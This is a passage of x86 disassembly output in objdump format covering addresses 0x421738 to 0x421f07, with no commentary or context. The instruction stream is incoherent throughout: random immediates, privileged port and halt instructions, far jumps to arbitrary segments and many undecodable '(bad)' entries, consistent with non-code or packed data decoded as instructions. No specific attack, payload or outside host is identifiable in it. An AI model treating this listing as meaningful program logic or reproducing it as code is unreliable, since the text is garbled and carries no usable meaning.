  421738:	cdq    
  421739:	inc    edi
  42173a:	cli    
  42173b:	hlt    
  42173c:	xchg   esi,eax
  42173d:	bnd jne 0x4216f4
  421740:	outs   dx,DWORD PTR ds:[esi]
  421741:	sbb    DWORD PTR [edx-0x51],eax
  421744:	push   0xd933dc8b
  421749:	add    BYTE PTR [ebp+0x37d11c26],ah
  42174f:	les    edx,FWORD PTR [ecx]
  421751:	fidivr WORD PTR [esi]
  421753:	cmp    ebp,ebp
  421755:	and    eax,0x572c77ea
  42175a:	xor    eax,0x1acab4f7
  42175f:	pop    eax
  421760:	stc    
  421761:	xchg   edx,eax
  421762:	test   al,0x9f
  421764:	mov    ds:0xf5c4b638,al
  421769:	jae    0x4216f2
  42176b:	sub    DWORD PTR [esi],edi
  42176d:	jbe    0x4217c5
  42176f:	ja     0x421797
  421771:	adc    esp,eax
  421773:	test   al,0x33
  421775:	cmp    edx,DWORD PTR [edx-0x7fd86e9d]
  42177b:	cmp    eax,0x7f26a28a
  421780:	je     0x421716
  421782:	inc    edx
  421783:	cmp    al,0xc0
  421785:	push   edi
  421786:	out    0xeb,al
  421788:	push   es
  421789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42178a:	lock rol BYTE PTR [ebx+0x7189c9cb],0xa0
  421792:	jge    0x42171a
  421794:	imul   ebx,esp,0xffffff99
  421797:	inc    edx
  421798:	enter  0x9c57,0x32
  42179c:	jmp    0x4217af
  42179e:	pushf  
  42179f:	cmp    eax,0x7bbbed2e
  4217a4:	mov    eax,0xc54e4bf0
  4217a9:	mov    BYTE PTR [eax+esi*1+0x6bf6d2d6],ch
  4217b0:	adc    esi,DWORD PTR [eax-0x1fac7bb5]
  4217b6:	and    eax,0xa1c90622
  4217bb:	xlat   BYTE PTR ds:[ebx]
  4217bc:	push   es
  4217bd:	dec    edx
  4217be:	pushf  
  4217bf:	mov    ds:0x2ef20b1b,al
  4217c4:	xchg   DWORD PTR [eax],esp
  4217c6:	call   0x6119:0xf95e8950
  4217cd:	sahf   
  4217ce:	mov    ah,0x12
  4217d0:	lock sbb DWORD PTR [eax],ebx
  4217d3:	test   al,0x27
  4217d5:	in     al,dx
  4217d6:	sub    DWORD PTR [edi-0x39a3b58a],0xffffff90
  4217dd:	hlt    
  4217de:	cs stos DWORD PTR es:[edi],eax
  4217e0:	sbb    ecx,DWORD PTR [edi]
  4217e2:	arpl   WORD PTR [edx+0x18],bp
  4217e5:	lahf   
  4217e6:	cmp    eax,0x1341264c
  4217eb:	retf   0x7648
  4217ee:	pop    esi
  4217ef:	popa   
  4217f0:	pop    esi
  4217f1:	test   eax,0xc15c7c30
  4217f6:	(bad)  
  4217f7:	enter  0x8979,0x29
  4217fb:	cdq    
  4217fc:	jno    0x4217ad
  4217fe:	jmp    0xfb3a80b5
  421803:	jg     0x4217d0
  421805:	fsub   QWORD PTR [edx-0x1dd3a769]
  42180b:	mov    esi,0x80fd32ba
  421810:	lods   al,BYTE PTR ds:[esi]
  421811:	mov    ds:0xa7916fb8,eax
  421816:	xchg   BYTE PTR [ecx+0x50],dl
  421819:	xor    ebx,DWORD PTR [ecx]
  42181b:	loope  0x421894
  42181d:	mov    esp,0x88c84b6b
  421822:	test   DWORD PTR [esi+edx*1+0x2a4cc625],0x4f326c43
  42182d:	xchg   ebx,eax
  42182e:	mov    al,ds:0x995b95b5
  421833:	(bad)  
  421834:	ss clc 
  421836:	jae    0x4218a2
  421838:	in     eax,dx
  421839:	(bad)  
  42183a:	sbb    eax,0x721623f9
  42183f:	aam    0x3c
  421841:	push   0xffffffbe
  421843:	sub    DWORD PTR [edx],0x3e6d334a
  421849:	ins    BYTE PTR es:[edi],dx
  42184a:	stos   DWORD PTR es:[edi],eax
  42184b:	mov    dh,0xc6
  42184d:	jmp    0x9f28:0xfa9c9382
  421854:	fidiv  WORD PTR [ebp+0x67]
  421857:	mov    bh,0xf1
  421859:	(bad)  
  42185b:	in     al,dx
  42185c:	out    0x7b,eax
  42185e:	sti    
  42185f:	loopne 0x42187a
  421861:	mov    WORD PTR [eax],ds
  421863:	mov    edi,0xe095080
  421868:	pop    ss
  421869:	stos   BYTE PTR es:[edi],al
  42186a:	and    bl,0xb7
  42186d:	xor    al,BYTE PTR [ebx]
  42186f:	sub    DWORD PTR [eax-0x3353c46c],0x60fdb369
  421879:	daa    
  42187a:	push   esi
  42187b:	(bad)  
  42187c:	mov    bh,0x26
  42187e:	cmp    BYTE PTR [edx-0x5adc0a6e],ah
  421884:	xchg   esp,eax
  421885:	xchg   DWORD PTR [edx+ebx*2+0x6f5e34c3],esi
  42188c:	enter  0x44d2,0xd6
  421890:	lods   eax,DWORD PTR ds:[esi]
  421891:	dec    ebx
  421892:	test   BYTE PTR [eax],bl
  421894:	cmp    BYTE PTR [ecx-0x783d8cdb],ch
  42189a:	punpcklwd mm6,DWORD PTR ds:0x667fabd4
  4218a1:	fs inc ebx
  4218a3:	shl    BYTE PTR [ebx],1
  4218a5:	adc    DWORD PTR [edi+0x107741f3],0xf20d2e66
  4218af:	test   ah,ch
  4218b1:	and    bh,bh
  4218b3:	cmp    BYTE PTR [edx-0x31],dl
  4218b6:	and    dl,BYTE PTR [eax*8-0x356b6d1c]
  4218bd:	mov    ecx,0xc47bf65f
  4218c3:	fbld   TBYTE PTR [ebp+0x48e4be3]
  4218c9:	fadd   QWORD PTR [ecx]
  4218cb:	mov    eax,ds:0xb6670d98
  4218d0:	ret    
  4218d1:	xor    cl,cl
  4218d3:	or     al,0xcb
  4218d5:	jg     0x42193c
  4218d7:	and    DWORD PTR [edx],esi
  4218d9:	call   0x824f3dbd
  4218de:	fistp  QWORD PTR cs:[esi-0x24]
  4218e2:	sub    edx,DWORD PTR [eax]
  4218e4:	int3   
  4218e5:	jg     0x42190d
  4218e7:	xor    ecx,DWORD PTR [edi+0x17]
  4218ea:	adc    eax,0xf5834ca1
  4218ef:	mov    al,ds:0xb192ad4a
  4218f4:	test   BYTE PTR [ecx+0x58],ch
  4218f7:	test   al,0xa7
  4218f9:	xlat   BYTE PTR ds:[ebx]
  4218fa:	and    eax,0xe7f9d2f7
  4218ff:	lods   eax,DWORD PTR ds:[esi]
  421900:	xor    edi,DWORD PTR [edi]
  421902:	pop    ebp
  421903:	xchg   BYTE PTR [ecx+0x4d],ch
  421906:	mov    cs,WORD PTR [di]
  421909:	adc    ecx,DWORD PTR [ecx-0x12355c21]
  42190f:	lods   eax,DWORD PTR ds:[esi]
  421910:	int    0x38
  421912:	and    DWORD PTR [ebx-0x2b],ecx
  421915:	mov    eax,DWORD PTR [eax-0x2b]
  421918:	loope  0x4218c1
  42191a:	sar    DWORD PTR [edi-0x66],0xa8
  42191e:	xchg   edi,eax
  42191f:	test   al,0x31
  421921:	pop    edx
  421922:	loopne 0x421936
  421924:	es into 
  421926:	into   
  421927:	loop   0x4218ff
  421929:	add    al,0xa2
  42192b:	add    DWORD PTR [ecx+0x4864f94c],ebp
  421931:	gs xchg ebp,eax
  421933:	lock xchg esp,eax
  421935:	ret    
  421936:	aad    0xc
  421938:	mov    bl,0x44
  42193a:	bound  ebx,QWORD PTR [ecx]
  42193c:	mov    edx,0xc3b3cd96
  421941:	push   ebp
  421942:	pop    esp
  421943:	or     al,0x13
  421945:	ins    BYTE PTR es:[edi],dx
  421946:	fidiv  DWORD PTR [edx+0x249297dd]
  42194c:	xchg   esp,eax
  42194d:	sbb    BYTE PTR [ebx],dl
  42194f:	aam    0xde
  421951:	mov    ah,0x36
  421953:	sbb    BYTE PTR [esi+0x54],0x9c
  421957:	fs ins BYTE PTR es:[edi],dx
  421959:	xor    DWORD PTR [edi+0x77071fcc],ebp
  42195f:	inc    ebx
  421960:	xchg   esi,eax
  421961:	mov    eax,ds:0xbe2bbea7
  421966:	pusha  
  421967:	iret   
  421968:	inc    esi
  421969:	jmp    0x4219d7
  42196b:	hlt    
  42196c:	mov    esp,0x5f058de0
  421971:	and    DWORD PTR [eax+edi*2-0xd],0x47
  421976:	aas    
  421977:	xchg   ecx,eax
  421978:	sub    DWORD PTR [esi],esp
  42197a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42197b:	retf   
  42197c:	pushf  
  42197d:	jo     0x421992
  42197f:	iret   
  421980:	les    esp,FWORD PTR [eax]
  421982:	pusha  
  421983:	adc    eax,0xf838821b
  421988:	(bad)  
  42198a:	mov    gs,WORD PTR [edx-0x4d]
  42198d:	loopne 0x421924
  42198f:	shl    edi,cl
  421991:	xorps  xmm7,XMMWORD PTR [ebx-0x8]
  421995:	repnz retf 0x1cdc
  421999:	mov    ch,0x8b
  42199b:	mov    dh,0xbc
  42199d:	sbb    eax,DWORD PTR [eax+0x78]
  4219a0:	pop    ebp
  4219a1:	je     0x421945
  4219a3:	lods   eax,DWORD PTR ds:[esi]
  4219a4:	sbb    dh,al
  4219a6:	stos   DWORD PTR es:[edi],eax
  4219a7:	jne    0x421970
  4219a9:	xchg   edx,eax
  4219aa:	rcr    bh,cl
  4219ac:	mov    ecx,0x3fe4db44
  4219b1:	leave  
  4219b2:	mov    ecx,0xbd5a762d
  4219b7:	pop    esp
  4219b8:	not    DWORD PTR [esi+0x4d43b4fa]
  4219be:	das    
  4219bf:	jmp    0x3b55:0xd5d109e5
  4219c6:	add    bl,BYTE PTR [ecx+ebx*8+0x2695b810]
  4219cd:	sub    eax,0x89c96f26
  4219d2:	hlt    
  4219d3:	fwait
  4219d4:	jb     0x42197c
  4219d6:	jb     0x421a57
  4219d8:	(bad)  
  4219d9:	push   ebp
  4219da:	cmp    ch,bh
  4219dc:	stos   BYTE PTR es:[edi],al
  4219dd:	xchg   ebp,eax
  4219de:	stos   BYTE PTR es:[edi],al
  4219df:	mov    BYTE PTR [esi+ebp*2-0x239f1461],dh
  4219e6:	stc    
  4219e7:	mov    ?,WORD PTR [ebx+0x59]
  4219ea:	jno    0x4219c0
  4219ec:	jmp    0x9203:0xf0eef71b
  4219f3:	loopne 0x421a70
  4219f5:	or     eax,0x56be155e
  4219fa:	mov    bh,0x51
  4219fc:	or     edx,DWORD PTR [edx-0x7d93b7b]
  421a02:	mov    bl,0xc8
  421a04:	loopne 0x421a46
  421a06:	jne    0x421a65
  421a08:	push   ebx
  421a09:	inc    eax
  421a0a:	push   cs
  421a0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a0c:	call   0xd0fd585b
  421a11:	xor    al,0x8b
  421a13:	inc    edx
  421a14:	mov    bh,0xe8
  421a16:	in     eax,dx
  421a17:	mov    esp,0xfea886b4
  421a1c:	pop    ebp
  421a1d:	mov    al,ds:0x95835108
  421a22:	arpl   WORD PTR [ecx+0x1f],dx
  421a25:	in     al,dx
  421a26:	mov    bh,0x3
  421a28:	dec    ebp
  421a29:	mov    al,ds:0x7d278406
  421a2e:	xchg   esi,eax
  421a2f:	idiv   esi
  421a31:	in     eax,0xad
  421a33:	fsubr  QWORD PTR [esi]
  421a35:	ret    
  421a36:	addr16 pusha 
  421a38:	mov    al,ds:0xee3d6276
  421a3d:	dec    esp
  421a3e:	mov    edx,0xbdb760e9
  421a43:	retf   
  421a44:	aaa    
  421a45:	or     al,BYTE PTR [ecx-0x2]
  421a48:	cmp    eax,DWORD PTR [ebx]
  421a4a:	jo     0x421a9d
  421a4c:	mov    ebx,0xad2246ac
  421a51:	lock cwde 
  421a53:	xlat   BYTE PTR ds:[ebx]
  421a54:	push   ebx
  421a55:	jmp    0x20111ab0
  421a5a:	jle    0x421a1a
  421a5c:	xchg   ebx,eax
  421a5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a5e:	xor    eax,0x43d70ccc
  421a63:	imul   edx,DWORD PTR [ebp-0x57c67d90],0x561e81e9
  421a6d:	push   esi
  421a6e:	push   ecx
  421a6f:	mov    ebp,0x786ab0b0
  421a74:	and    BYTE PTR fs:[edi],ah
  421a77:	inc    ebp
  421a78:	bnd gs jmp 0x379ff79f
  421a7f:	test   DWORD PTR [ebp-0x70],ebx
  421a82:	mov    BYTE PTR [esp+ecx*1],ah
  421a85:	test   DWORD PTR [ebp+ebp*2-0x135011d3],esp
  421a8c:	shl    DWORD PTR [edi+eiz*1],1
  421a8f:	bound  ecx,QWORD PTR [eax-0x36ed5bf3]
  421a95:	fild   WORD PTR [edx]
  421a97:	addr16 jo 0x421a52
  421a9a:	add    DWORD PTR [ecx-0x16],0xb21c80b9
  421aa1:	push   ecx
  421aa2:	adc    al,0x55
  421aa4:	pop    ds
  421aa5:	retf   
  421aa6:	mov    ebp,0x644304c0
  421aab:	adc    esp,DWORD PTR [eax+eiz*8]
  421aae:	not    BYTE PTR [esi+eax*8+0x723b7ec7]
  421ab5:	fidivr DWORD PTR [ebp-0x1f04511a]
  421abb:	mov    cl,0xf3
  421abd:	or     eax,0x8c5b67be
  421ac2:	push   esi
  421ac3:	lock push esi
  421ac5:	loopne 0x421a9f
  421ac7:	bound  edx,QWORD PTR [esi+0x72]
  421aca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421acb:	test   eax,0x9e31dec9
  421ad0:	add    eax,0xe536cd06
  421ad5:	and    ch,bh
  421ad7:	mov    edi,0x2df9ef60
  421adc:	jp     0x421b36
  421ade:	inc    esp
  421adf:	lahf   
  421ae0:	lock hlt 
  421ae2:	push   0xffffffb0
  421ae4:	mov    DWORD PTR [eax-0x12667b99],0xc6276600
  421aee:	sub    esi,DWORD PTR [ebp-0x7cfe5dd5]
  421af4:	arpl   WORD PTR [edi],di
  421af6:	ins    DWORD PTR es:[edi],dx
  421af7:	xor    ebx,edi
  421af9:	shl    ch,1
  421afb:	lea    ebx,[esi-0x5ea003d9]
  421b01:	lahf   
  421b02:	(bad)  
  421b03:	ror    BYTE PTR [edi-0x66],cl
  421b06:	sub    DWORD PTR [ebx+ebx*8-0x1e],edx
  421b0a:	mov    ebp,0x591a1fe0
  421b0f:	fistp  DWORD PTR [edx+0x30]
  421b12:	(bad)  
  421b14:	pop    esi
  421b15:	or     al,0x87
  421b17:	xchg   esi,eax
  421b18:	shr    bl,cl
  421b1a:	push   ebx
  421b1b:	sub    al,0x7c
  421b1d:	or     DWORD PTR [esi+edx*1-0x33],ebx
  421b21:	sub    BYTE PTR [ebx+0x40],0x28
  421b25:	mov    eax,0xc57b8ea7
  421b2a:	xchg   edx,eax
  421b2b:	dec    eax
  421b2c:	retf   
  421b2d:	inc    ebx
  421b2e:	icebp  
  421b2f:	cmp    cl,ah
  421b31:	sti    
  421b32:	or     eax,0x66250017
  421b37:	ja     0x421afe
  421b39:	sti    
  421b3a:	lahf   
  421b3b:	fmul   st(2),st
  421b3d:	adc    al,0xdb
  421b3f:	in     eax,dx
  421b40:	aaa    
  421b41:	sub    al,0xbb
  421b43:	sub    BYTE PTR [ecx-0x43],ah
  421b46:	mov    ah,0x34
  421b48:	add    ah,BYTE PTR [ebp-0x539f16a2]
  421b4e:	icebp  
  421b4f:	(bad)  
  421b50:	cwde   
  421b51:	sahf   
  421b52:	je     0x421b67
  421b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b55:	cdq    
  421b56:	fistp  WORD PTR [esi+0x21]
  421b59:	mov    ah,0xdf
  421b5b:	stc    
  421b5c:	mov    al,0xba
  421b5e:	mov    BYTE PTR [edx+0x69],al
  421b61:	scas   al,BYTE PTR es:[edi]
  421b62:	pop    es
  421b63:	(bad)  
  421b64:	aad    0xf0
  421b66:	loope  0x421baf
  421b68:	jl     0x421b09
  421b6a:	jo     0x421b1d
  421b6c:	rcl    DWORD PTR [ebx+esi*4+0x5d87239a],cl
  421b73:	lock test al,0xfc
  421b76:	xchg   ecx,eax
  421b77:	inc    esp
  421b78:	mov    esi,0x81cdfd8c
  421b7d:	sbb    bl,al
  421b7f:	imul   BYTE PTR ds:0x447eb5d6
  421b85:	pop    ss
  421b86:	xchg   ebp,eax
  421b87:	xlat   BYTE PTR ds:[ebx]
  421b88:	adc    ebp,ecx
  421b8a:	xchg   esp,eax
  421b8b:	push   0xf4b6214
  421b90:	ins    BYTE PTR es:[edi],dx
  421b91:	xchg   esi,eax
  421b92:	out    0xe1,al
  421b94:	cmp    ebx,DWORD PTR [ecx-0x2e5a1111]
  421b9a:	mov    ebx,0x89e76c5e
  421b9f:	add    edi,DWORD PTR [ecx+edx*1+0x38]
  421ba3:	dec    ebp
  421ba4:	jne    0x421b41
  421ba6:	jmp    0x87eb:0x316d74f9
  421bad:	dec    ebx
  421bae:	or     ebx,DWORD PTR [eax+0x636c7112]
  421bb4:	out    dx,eax
  421bb5:	nop
  421bb6:	sub    bh,BYTE PTR [eax+eax*4-0xf]
  421bba:	or     ecx,DWORD PTR [edi+0x29]
  421bbd:	push   esi
  421bbe:	les    esp,FWORD PTR [ecx]
  421bc0:	mov    esi,0x42b17468
  421bc5:	rcr    DWORD PTR [ebp+edi*1-0x706c44da],cl
  421bcc:	sub    DWORD PTR [edi],0x19
  421bcf:	mov    ebp,0xb599af09
  421bd4:	(bad)  
  421bd5:	std    
  421bd6:	cmc    
  421bd7:	pusha  
  421bd8:	outs   dx,BYTE PTR ds:[esi]
  421bd9:	mov    ds:0xc4cca917,eax
  421bde:	fld    TBYTE PTR [esi-0xdc5d41c]
  421be4:	jmp    0xab93:0xbafbd7db
  421beb:	jle    0x421c1a
  421bed:	inc    esi
  421bee:	add    ecx,edi
  421bf0:	pop    edi
  421bf1:	imul   edi,DWORD PTR [ebp-0x68a26b66],0xffffffaa
  421bf8:	ja     0x421bea
  421bfa:	xlat   BYTE PTR ds:[ebx]
  421bfb:	test   esp,edi
  421bfd:	ret    0x9839
  421c00:	pop    ebp
  421c01:	add    ebp,DWORD PTR [eax+0x79bc8385]
  421c07:	aas    
  421c08:	cld    
  421c09:	jbe    0x421bc5
  421c0b:	pop    edi
  421c0c:	xchg   ecx,eax
  421c0d:	and    eax,0xebd96c19
  421c12:	inc    esp
  421c13:	mov    ah,0x37
  421c15:	dec    edx
  421c16:	xchg   BYTE PTR [ecx+0x4d],bl
  421c19:	pop    esp
  421c1a:	inc    esp
  421c1b:	pop    eax
  421c1c:	outs   dx,BYTE PTR ds:[esi]
  421c1d:	in     eax,dx
  421c1e:	and    edi,esi
  421c20:	stos   DWORD PTR es:[edi],eax
  421c21:	dec    edi
  421c22:	sub    BYTE PTR [ebx+ebx*8],0x89
  421c26:	add    ah,BYTE PTR [ebx+0x70]
  421c29:	outs   dx,DWORD PTR ds:[esi]
  421c2a:	mov    dh,al
  421c2c:	out    0x83,al
  421c2e:	lahf   
  421c2f:	xchg   DWORD PTR [eax+eiz*8+0x5d0b195f],ebx
  421c36:	add    DWORD PTR [edx+0x7],0x428e6054
  421c3d:	leave  
  421c3e:	pop    ebp
  421c3f:	cmp    eax,0x62772d3a
  421c44:	dec    esi
  421c45:	inc    ebp
  421c46:	sbb    al,0xd0
  421c48:	cmp    DWORD PTR [edi+0x73],ebp
  421c4b:	mov    ds:0xf0441bb7,al
  421c50:	inc    edi
  421c51:	mov    edi,0x9fbd6381
  421c56:	cmp    ecx,DWORD PTR [ebp+0x36]
  421c59:	fs (bad) 
  421c5b:	das    
  421c5c:	and    cl,BYTE PTR [ecx-0x78]
  421c5f:	nop
  421c60:	jno    0x421ccc
  421c62:	mov    ah,bh
  421c64:	add    al,0x49
  421c66:	jmp    0x421c75
  421c68:	les    ebx,FWORD PTR [esi+ecx*4]
  421c6b:	fdiv   st(5),st
  421c6d:	mov    DWORD PTR [ebx],ecx
  421c6f:	mov    ch,BYTE PTR [edx+0x34]
  421c72:	jmp    0x84c9:0xb2bfdaa3
  421c79:	sub    ebx,esi
  421c7b:	sub    al,0x5f
  421c7d:	dec    esi
  421c7e:	out    0x26,eax
  421c80:	loope  0x421cf9
  421c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c83:	popf   
  421c84:	fist   WORD PTR [edi+0x7d4bbda3]
  421c8a:	das    
  421c8b:	bound  edi,QWORD PTR [edi+ebx*2]
  421c8e:	repnz xor dx,WORD PTR [ecx+edx*8+0x28]
  421c94:	scas   al,BYTE PTR es:[edi]
  421c95:	sub    BYTE PTR [ebx-0x6ca8e7f7],dh
  421c9b:	mov    ebp,edi
  421c9d:	xor    al,0x72
  421c9f:	or     BYTE PTR [esi+0x367feca],0x7a
  421ca6:	sbb    ebp,DWORD PTR [ebp-0x2f0b44d6]
  421cac:	jb     0x421c90
  421cae:	idiv   BYTE PTR [ebx+0x32fe42d7]
  421cb4:	(bad)  
  421cb5:	ss mov ebx,0x99869325
  421cbb:	push   edx
  421cbc:	(bad)  
  421cbd:	mov    edi,0x95b55e99
  421cc2:	jnp    0x421cd8
  421cc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cc5:	hlt    
  421cc6:	mov    al,ds:0x75e4a640
  421ccb:	shl    ah,0x2b
  421cce:	lahf   
  421ccf:	stc    
  421cd0:	adc    BYTE PTR [edx-0x54],ch
  421cd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cd4:	int    0x29
  421cd6:	clc    
  421cd7:	aad    0xdf
  421cd9:	jne    0x421c8f
  421cdb:	push   ebp
  421cdc:	clc    
  421cdd:	test   DWORD PTR [eax-0x80],ebp
  421ce0:	pusha  
  421ce1:	add    dh,al
  421ce3:	clc    
  421ce4:	inc    esi
  421ce5:	add    al,0x95
  421ce7:	out    0x2e,al
  421ce9:	fstp   QWORD PTR [edx+0x1a]
  421cec:	aas    
  421ced:	es or  eax,0x9908ac53
  421cf3:	rcl    dh,0xae
  421cf6:	push   esp
  421cf7:	mov    bh,bh
  421cf9:	jnp    0x421d14
  421cfb:	inc    ecx
  421cfc:	mov    edi,0xb4630ab9
  421d01:	mov    ch,0x75
  421d03:	bound  ebp,QWORD PTR [edx]
  421d05:	aas    
  421d06:	ss mov ebp,0xb0fc1320
  421d0c:	push   ecx
  421d0d:	ds nop
  421d0f:	inc    ebx
  421d10:	ds mov eax,0x3e4f1375
  421d16:	push   eax
  421d17:	mov    ?,WORD PTR [ebp-0x39]
  421d1a:	xchg   ebp,eax
  421d1b:	scas   eax,DWORD PTR es:[edi]
  421d1c:	push   0x4
  421d1e:	stos   BYTE PTR es:[edi],al
  421d1f:	inc    edx
  421d20:	pop    ecx
  421d21:	sbb    DWORD PTR [ebp+0x6c521efd],esi
  421d27:	sar    esi,0x43
  421d2a:	add    eax,0x2589ef33
  421d2f:	gs (bad) 
  421d31:	stc    
  421d32:	jae    0x421cc9
  421d34:	test   DWORD PTR [ebx+0x65],edx
  421d37:	fiadd  DWORD PTR [ebx]
  421d39:	shl    BYTE PTR [esi],cl
  421d3b:	add    al,0x65
  421d3e:	aas    
  421d3f:	and    esi,DWORD PTR [ecx-0x7b]
  421d42:	jo     0x421d46
  421d44:	stc    
  421d45:	xchg   esi,eax
  421d46:	scas   al,BYTE PTR es:[edi]
  421d47:	xchg   edi,eax
  421d48:	adc    DWORD PTR [ebx-0x6a07027a],0x44
  421d4f:	xchg   esp,eax
  421d50:	rcl    BYTE PTR [edi],1
  421d52:	mov    ch,0xe
  421d54:	sub    esi,DWORD PTR [edi-0x6dd725e6]
  421d5a:	adc    BYTE PTR [eax],ah
  421d5c:	arpl   WORD PTR [esi],dx
  421d5e:	pop    edi
  421d5f:	cmc    
  421d60:	(bad)  [edx+eax*2+0x73]
  421d64:	rep outs dx,DWORD PTR ds:[esi]
  421d66:	dec    esp
  421d67:	push   ds
  421d68:	fbstp  TBYTE PTR [ebx-0x133d285b]
  421d6e:	fstp   QWORD PTR [ecx+0x3c895c92]
  421d74:	pop    ds
  421d75:	pop    edi
  421d76:	sub    al,0x90
  421d78:	jl     0x421cfe
  421d7a:	in     eax,0x34
  421d7c:	rcl    BYTE PTR [edi-0x2ed54fbc],1
  421d82:	daa    
  421d83:	iret   
  421d84:	pop    esp
  421d85:	sbb    al,0x76
  421d87:	daa    
  421d88:	inc    ebp
  421d89:	int3   
  421d8a:	and    ecx,esp
  421d8c:	rcr    BYTE PTR [ebx],0x37
  421d8f:	sub    al,0xb1
  421d91:	pop    eax
  421d92:	mov    dl,0xa9
  421d94:	mov    bl,BYTE PTR [ecx]
  421d96:	lea    eax,[ecx]
  421d98:	out    dx,al
  421d99:	mov    bl,0x1e
  421d9b:	dec    edi
  421d9c:	call   0x1f9d2abc
  421da1:	fwait
  421da2:	jo     0x421d8b
  421da4:	mov    esp,0x306332d5
  421da9:	fs pop ebp
  421dab:	sbb    eax,0x177e8635
  421db0:	mov    ah,0x55
  421db2:	sub    bl,BYTE PTR [ebx]
  421db4:	ins    BYTE PTR es:[edi],dx
  421db5:	lea    edx,[eax+0x4a]
  421db8:	out    dx,eax
  421db9:	mov    ecx,0x3db68813
  421dbe:	aas    
  421dbf:	jne    0x421d48
  421dc1:	lods   eax,DWORD PTR ds:[esi]
  421dc2:	shl    DWORD PTR [eax+0x27c8b196],0x4c
  421dc9:	aas    
  421dca:	out    0xfc,eax
  421dcc:	loop   0x421e33
  421dce:	jo     0x421e46
  421dd0:	mov    BYTE PTR [edi-0x60],dh
  421dd3:	adc    BYTE PTR [ebp-0xa],ah
  421dd6:	adc    eax,0x478e9a44
  421ddb:	dec    edx
  421ddc:	loope  0x421d7a
  421dde:	mov    dl,0xfd
  421de0:	sub    al,0xee
  421de2:	outs   dx,BYTE PTR ds:[esi]
  421de3:	sbb    al,0x43
  421de5:	es cmp al,0x27
  421de8:	icebp  
  421de9:	pop    ecx
  421dea:	inc    esp
  421deb:	sbb    ebp,esp
  421ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dee:	idiv   BYTE PTR [eax-0x461d5e01]
  421df4:	aaa    
  421df5:	jle    0x421e06
  421df7:	push   ebx
  421df8:	jmp    0x1d60:0xa305d4a3
  421dff:	xchg   ebp,eax
  421e00:	jno    0x421dd2
  421e02:	(bad)  
  421e03:	cmp    ch,bl
  421e05:	imul   ecx,DWORD PTR [ebx+eiz*8+0x3d77efae],0x4e
  421e0d:	mov    edi,DWORD PTR [ebx]
  421e0f:	dec    esp
  421e10:	add    eax,0x83b0bebf
  421e15:	inc    esi
  421e16:	cwde   
  421e17:	cdq    
  421e18:	int    0x92
  421e1a:	in     eax,dx
  421e1b:	out    0x1f,al
  421e1d:	push   ss
  421e1e:	jge    0x421df9
  421e20:	adc    eax,0xd6b84e40
  421e25:	adc    bh,BYTE PTR [ebx-0x4afdeb15]
  421e2b:	pushf  
  421e2c:	and    al,0xff
  421e2e:	xchg   ecx,eax
  421e2f:	ficom  WORD PTR [edi-0x15fe71d2]
  421e35:	lahf   
  421e36:	xor    edx,DWORD PTR [ebx+0x6e]
  421e39:	xchg   ebp,eax
  421e3a:	and    ebx,DWORD PTR [ebp+0xb2e892]
  421e40:	mov    edx,0xe9e94e6
  421e45:	push   cs
  421e46:	add    BYTE PTR [eax+0x3e],0xb6
  421e4a:	pop    ebp
  421e4b:	dec    edi
  421e4c:	or     edx,esi
  421e4e:	add    DWORD PTR es:[edx],edx
  421e51:	mov    eax,0xfdf392c3
  421e56:	or     BYTE PTR [esi+0x21990a7],dh
  421e5c:	pop    ebx
  421e5d:	js     0x421e84
  421e5f:	lock cmp BYTE PTR [ebx+ecx*1-0x151510eb],ch
  421e67:	cdq    
  421e68:	xchg   ecx,eax
  421e69:	xchg   esp,eax
  421e6a:	std    
  421e6b:	xchg   ebp,eax
  421e6c:	xor    bl,al
  421e6e:	mov    cs,WORD PTR [ecx+0x71cb9e49]
  421e74:	mov    bl,0x76
  421e76:	iret   
  421e77:	dec    ebp
  421e78:	cli    
  421e79:	push   ebp
  421e7a:	ins    BYTE PTR es:[edi],dx
  421e7b:	ja     0x421e6b
  421e7d:	sbb    DWORD PTR [ebx+ecx*2],ecx
  421e80:	xchg   ebx,eax
  421e81:	mov    ds:0x3e417cda,eax
  421e86:	bound  edi,QWORD PTR [edi-0x4c31d5e1]
  421e8c:	mov    eax,0x3854930b
  421e91:	(bad)  
  421e92:	aad    0x6f
  421e94:	popf   
  421e95:	mov    DWORD PTR [edi],esi
  421e97:	add    al,0xcc
  421e99:	and    ebx,esi
  421e9b:	sub    BYTE PTR [eax+0x4694958a],bl
  421ea1:	(bad)  
  421ea2:	es pop ebp
  421ea4:	adc    dh,BYTE PTR [ebp-0x18eb81f6]
  421eaa:	and    BYTE PTR [ebp+0x3d2faa88],ah
  421eb0:	and    ch,BYTE PTR [edx]
  421eb2:	scas   al,BYTE PTR es:[edi]
  421eb3:	clc    
  421eb4:	xor    esi,DWORD PTR [ebp-0x6b]
  421eb7:	mov    eax,0x8cda314e
  421ebc:	push   ss
  421ebd:	fsubr  st(6),st
  421ebf:	cld    
  421ec0:	xlat   BYTE PTR ds:[ebx]
  421ec1:	cmp    DWORD PTR [esi+0x28],eax
  421ec4:	mov    dl,0xc8
  421ec6:	or     DWORD PTR [edx-0x25],0xd
  421eca:	push   esp
  421ecb:	gs xchg ebp,eax
  421ecd:	sbb    dh,ah
  421ecf:	sub    eax,0xe6e09c1f
  421ed4:	cmp    eax,0xf050c021
  421ed9:	push   0xcfb92c70
  421ede:	sahf   
  421edf:	retf   
  421ee0:	dec    edi
  421ee1:	fwait
  421ee2:	aam    0x36
  421ee4:	xor    ebp,0x2d
  421ee7:	jb     0x421ef1
  421ee9:	imul   esi,DWORD PTR [ebx+edx*2],0x10
  421eed:	mov    esi,0x5898189b
  421ef2:	jl     0x421ee7
  421ef4:	int3   
  421ef5:	lock frstor [eax+0x40]
  421ef9:	gs icebp 
  421efb:	xor    ebp,DWORD PTR [eax]
  421efd:	ja     0x421f52
  421eff:	js     0x421f40
  421f01:	div    BYTE PTR [edx-0xbe6f6e2]
  421f07:	imul   edx,DWORD PTR [eax+0x73],0xffffffac
